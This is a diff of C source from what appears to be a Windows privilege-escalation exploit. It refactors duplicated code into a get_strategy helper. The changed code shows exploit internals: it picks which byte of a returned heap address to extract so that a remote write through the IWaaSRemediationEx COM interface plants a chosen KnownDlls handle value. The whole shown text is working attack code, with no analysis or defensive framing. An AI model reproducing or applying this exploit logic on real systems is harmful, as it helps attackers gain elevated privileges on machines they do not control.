@@ -291,6 +291,30 @@ HRESULT invoke_launch_detection_only(
     return IWaaSRemediationEx_Invoke(Interface, DispId, &IID_Null, 1033, DISPATCH_METHOD, &Params, &VarResult, &ExcepInfo, &ArgErr);
 }
 
+ULONG32 get_strategy(
+    IN ULONG32 TargetValue)
+{
+    ULONG32 Strategy = 0;
+
+    //
+    // If the target handle value is 0x18, 0x38, 0x58 (etc.), we have a higher chance of hitting
+    // the right value if we extract the first byte (index 0) of the returned heap address.
+    //
+    if (TargetValue >= 0x18)
+    {
+        Strategy = ((TargetValue - 0x18) % 32 == 0) ? EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_0 : EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_1;
+    }
+    //
+    // Otherwise, extract the second byte (index 1) of the returned heap address.
+    //
+    else
+    {
+        Strategy = EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_1;
+    }
+
+    return Strategy;
+}
+
 BOOL calculate_write_addresses(
     IN PVOID BaseAddress,
     IN ULONG32 TargetValue,
@@ -333,22 +357,7 @@ BOOL calculate_write_addresses(
     //     00007fff`971dc038  00 00 00 00  00 00 00 00    <- NOT USED
     //
 
-    //
-    // If the target handle value is 0x18, 0x38, 0x58 (etc.), we have a higher chance of hitting
-    // the right value if we extract the first byte (index 0) of the returned heap address.
-    //
-    if (TargetValue >= 0x18)
-    {
-        Strategy = ((TargetValue - 0x18) % 32 == 0) ? EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_0 : EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_1;
-    }
-    //
-    // Otherwise, extract the second byte (index 1) of the returned heap address.
-    //
-    else
-    {
-        Strategy = EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_1;
-    }
-
+    Strategy = get_strategy(TargetValue);
 
     if (Strategy == EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_0)
     {
@@ -619,27 +628,11 @@ BOOL write_remote_known_dll_handle(
     }
 
     memset(&WriteParams, 0, sizeof(WriteParams));
-    WriteParams.CallerApplicationName       = SysAllocString(L"");
-    WriteParams.Plugins                     = SysAllocString(L"");
-    WriteParams.DispIdLaunchDetectionOnly   = DispIdLaunchDetectionOnly;
-    WriteParams.DispIdLaunchRemediationOnly = DispIdLaunchRemediationOnly;
-
-    //
-    // If the target handle value is 0x18, 0x38, 0x58 (etc.), we have a higher chance of hitting
-    // the right value if we extract the first byte (index 0) of the returned heap address.
-    //
-    if (TargetValue >= 0x18)
-    {
-        WriteParams.Strategy = ((TargetValue - 0x18) % 32 == 0) ? EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_0 : EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_1;
-    }
-    //
-    // Otherwise, extract the second byte (index 1) of the returned heap address.
-    //
-    else
-    {
-        WriteParams.Strategy = EXPLOIT_STRATEGY_EXTRACT_BYTE_AT_INDEX_1;
-    }
-
+    WriteParams.CallerApplicationName        = SysAllocString(L"");
+    WriteParams.Plugins                      = SysAllocString(L"");
+    WriteParams.DispIdLaunchDetectionOnly    = DispIdLaunchDetectionOnly;
+    WriteParams.DispIdLaunchRemediationOnly  = DispIdLaunchRemediationOnly;
+    WriteParams.Strategy                     = get_strategy(TargetValue);
     WriteParams.WaaSRemediationEx            = IWaaSRemediationEx;
     WriteParams.WriteAtLaunchDetectionOnly   = WriteAtLaunchDetectionOnly;
     WriteParams.WriteAtLaunchRemediationOnly = WriteAtLaunchRemediationOnly;
